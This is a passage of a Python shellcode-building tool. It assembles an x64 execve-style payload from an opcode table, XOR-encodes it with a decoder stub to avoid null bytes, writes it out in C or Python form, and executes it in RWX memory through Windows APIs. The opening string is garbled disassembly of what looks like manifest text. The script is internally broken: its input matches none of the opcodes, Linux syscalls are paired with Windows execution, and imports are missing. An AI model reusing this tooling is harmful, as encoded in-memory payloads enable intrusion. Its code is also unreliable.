and    BYTE PTR [edx+esi*2],bh
gs jno 0x40458b
gs jae 0x40458d
gs fs inc ebp
js     0x404583
arpl   WORD PTR [ebp+0x74],si
imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
ins    BYTE PTR es:[edi],dx
and    BYTE PTR [ebp+eiz*2+0x76],ch
gs ins BYTE PTR es:[edi],dx
cmp    eax,0x49736122
outs   dx,BYTE PTR ds:[esi]
jbe    0x4045a6
imul   esp,DWORD PTR [ebp+0x72],0x22
and    BYTE PTR [ebp+0x69],dh
inc    ecx
arpl   WORD PTR [ebx+0x65],sp
jae    0x4045b7
cmp    eax,0x6c616622
jae    0x4045b0
and    ch,BYTE PTR [edi]
ds or  eax,0x2020200a
and    BYTE PTR [eax],ah
and    BYTE PTR [edi+ebp*1],bh
jb     0x4045bf
jno    0x4045d1
gs jae 0x4045d3
gs fs push eax
jb     0x4045cd
jbe    0x4045cf
ins    BYTE PTR es:[edi],dx
gs addr16 gs jae 0x4045aa
or     eax,0x2020200a
and    BYTE PTR [edi+ebp*1],bh
jae    0x4045db
arpl   WORD PTR [ebp+0x72],si
imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
cmp    al,0x2f
je     0x4045f7
jne    0x4045fa
je     0x4045d2
outs   dx,BYTE PTR ds:[esi]
outs   dx,WORD PTR ds:[esi]
ds or  eax,0x612f3c0a
jae    0x404607
gs ins DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],dh
BYTE PTR [eax],al
or     al,0x0
BYTE PTR [eax],al
cwde
xor    BYTE PTR [eax],al
"""

# Predefined opcode mappings (simplified for common x64 instructions)
OPCODE_MAP = {
    "xor rax,rax":          b"\x48\x31\xc0",
    "xor rdi,rdi":          b"\x48\x31\xff",
    "xor rsi,rsi":          b"\x48\x31\xf6",
    "xor rdx,rdx":          b"\x48\x31\xd2",
    "jmp end":              b"\xeb\x1f",
    "pop rsi":              b"\x5e",
    "mov rdi,rsi":          b"\x48\x89\xf7",
    "add rdi,0x7":          b"\x48\x83\xc7\x07",
    "mov rdx,rdi":          b"\x48\x89\xfa",
    "add rdx,0xf":          b"\x48\x83\xc2\x0f",
    "mov rcx,rsi":          b"\x48\x89\xf1",
    "sub rcx,rdi":          b"\x48\x29\xf9",
    "mov al,0x3b":          b"\xb0\x3b",
    "syscall":              b"\x0f\x05",
    "call loop":            b"\xe8\xdc\xff\xff\xff",
}

# Configuration
XOR_KEY = 0xAA  # Default XOR key
OUTPUT_FILE = "shellcode.bin"

def xor_encode(shellcode, key=XOR_KEY):
    """XOR-encode shellcode to avoid null bytes."""
    return bytes([b ^ key for b in shellcode])

def generate_xor_decoder_stub(encoded_shellcode, key=XOR_KEY):
    """Generates a decoder stub to XOR-decode the shellcode at runtime."""
    decoder_stub = f"""
    ; XOR decoder stub (key: 0x{key:02x})
    xor    rcx, rcx                         ; RCX = 0 (counter)
    mov    rdx, {len(encoded_shellcode)}    ; RDX = shellcode length
    lea    rsi, [rel $+7]                   ; RSI = address of encoded shellcode
    decode_loop:
    xor    byte [rsi + rcx], {hex(key)}     ; Decode byte
    inc    rcx                              ; Increment counter
    cmp    rcx, rdx                         ; Check if done
    jne    decode_loop                      ; Loop if not
    jmp    rsi                              ; Jump to decoded shellcode
    """
    return decoder_stub

def parse_assembly():
    """Converts assembly instructions to shellcode using OPCODE_MAP."""
    shellcode = bytearray()
    lines = [line.strip() for line in ASSEMBLY_CODE.split('\n') if line.strip()]
    
    for line in lines:
        # Extract instruction (ignore comments)
        instruction = line.split(';')[0].strip()
        if instruction in OPCODE_MAP:
            shellcode.extend(OPCODE_MAP[instruction])
        else:
            print(f"[!] Unknown instruction: {instruction}")
    return bytes(shellcode)

def format_shellcode(shellcode, format_type="c", bytes_per_line=16):
    """Formats shellcode for C or Python."""
    formatted = []
    for i in range(0, len(shellcode), bytes_per_line):
        chunk = shellcode[i:i+bytes_per_line]
        hex_str = "".join([f"\\x{b:02x}" for b in chunk])
        if format_type == "c":
            formatted.append(f'"{hex_str}"')
        else:
            formatted.append(f'buf += b"{hex_str}"')
    return "\n".join(formatted)

def write_shellcode_to_file(shellcode, filename):
    """Writes raw shellcode to a file."""
    try:
        with open(filename, "wb") as f:
            f.write(shellcode)
        print(f"[+] Raw shellcode saved to: {filename}")
    except Exception as e:
        print(f"[!] Failed to write file: {e}")

def test_shellcode(shellcode):
    """Executes shellcode in memory (for testing)."""
    try:
        ptr = windll.kernel32.VirtualAlloc(None, len(shellcode), 0x1000, 0x40)
        if not ptr:
            print("[!] Failed to allocate memory")
            return False
        windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
        windll.kernel32.FlushInstructionCache(windll.kernel32.GetCurrentProcess(), ptr, len(shellcode))
        func_type = CFUNCTYPE(None)
        func = cast(ptr, func_type)
        print("[+] Executing shellcode...")
        func()
        windll.kernel32.VirtualFree(ptr, 0, 0x8000)
        return True
    except Exception as e:
        print(f"[!] Shellcode execution failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Convert assembly to XOR-encoded shellcode with decoder stub.")
    parser.add_argument("--output", help="Output .bin file (default: shellcode.bin)", default=OUTPUT_FILE)
    parser.add_argument("--format", help="Output format: c (default) or python", default="c")
    parser.add_argument("--no-xor", help="Disable XOR encoding", action="store_true")
    parser.add_argument("--test", help="Test shellcode execution", action="store_true")
    args = parser.parse_args()

    # Generate raw shellcode
    shellcode = parse_assembly()
    if not shellcode:
        print("[!] No shellcode generated. Check ASSEMBLY_CODE and OPCODE_MAP.")
        return

    # XOR-encode by default (unless --no-xor is specified)
    if not args.no_xor:
        encoded_shellcode = xor_encode(shellcode)
        decoder_stub = generate_xor_decoder_stub(encoded_shellcode)
        print("[+] XOR-encoded shellcode (key: 0x{:02x}) with decoder stub:".format(XOR_KEY))
        print(decoder_stub)
        shellcode = encoded_shellcode

    print(f"[+] Shellcode size: {len(shellcode)} bytes")

    write_shellcode_to_file(shellcode, args.output)
    print(f"\n// --- {args.format.upper()} Shellcode ---")
    print(format_shellcode(shellcode, args.format))

    if args.test:
        print("\n[+] Testing shellcode...")
        test_shellcode(shellcode)

if __name__ == "__main__":
    main()
